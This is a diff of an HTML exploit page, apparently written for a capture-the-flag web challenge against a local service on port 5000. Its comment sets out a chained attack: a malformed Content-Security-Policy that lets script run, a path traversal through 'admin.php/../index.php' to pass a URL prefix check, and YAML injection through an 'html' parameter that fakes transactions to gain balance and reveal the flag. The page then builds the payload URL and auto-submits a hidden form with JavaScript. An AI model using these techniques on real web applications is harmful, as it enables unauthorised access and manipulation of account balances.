@@ -2,25 +2,32 @@
 <html>
 <body>
 <!-- 
-THE ACTUAL EXPLOIT:
+THE REAL EXPLOIT - CSP Bypass + Path Traversal + YAML Injection
 
-After analyzing the PHP comparison vulnerabilities from CTFs, I think the 
-real issue might be in how PHP handles the arithmetic or comparisons.
+Key insights from analysis:
+1. CSP has syntax error: "style-src 'unsafe-inline;" (missing closing quote)
+2. This malformed CSP might be ignored by Chromium, allowing JS execution
+3. Path traversal: admin.php/../index.php still starts with required prefix
+4. We can control YAML content through index.php?html= parameter
 
-But let me try the simplest approach first - what if the vulnerability
-is that we can somehow bypass the balance check through a different path?
+Strategy:
+1. Use path traversal to point to index.php while satisfying URL prefix check
+2. Inject YAML that gives us enough balance to buy FL currency
+3. The malformed CSP allows our auto-submit JavaScript to work
 
-Looking at the YAML parsing and the transaction processing, maybe there's
-a way to manipulate the YAML structure itself.
-
-Let me try the original approach but with URL-encoded parameters:
+The YAML strategy:
+- First transaction: SELL 1 FL (exploiting uninitialized inventory)
+- This should add 1,000,000 to our balance (FL exchange rate)  
+- Second transaction: BUY 1 FL (now affordable with large balance)
+- Result: FL in final inventory = flag revealed!
 -->
 
 <form id="f" action="http://localhost:5000/admin.php" method="POST">
-    <input type="hidden" name="url" value="http://localhost:5000/admin.php?transactions%5B0%5D%5Bamount%5D=1&transactions%5B0%5D%5Bcountry%5D=FLAG">
+    <input type="hidden" name="url" value="http://localhost:5000/admin.php/../index.php?html=-%20amount:%201%0A%20%20currency:%20FL%0A%20%20op:%20SELL%0A-%20amount:%201%0A%20%20currency:%20FL%0A%20%20op:%20BUY">
 </form>
 
 <script>
+// This JavaScript should execute due to the malformed CSP!
 document.getElementById('f').submit();
 </script>
 
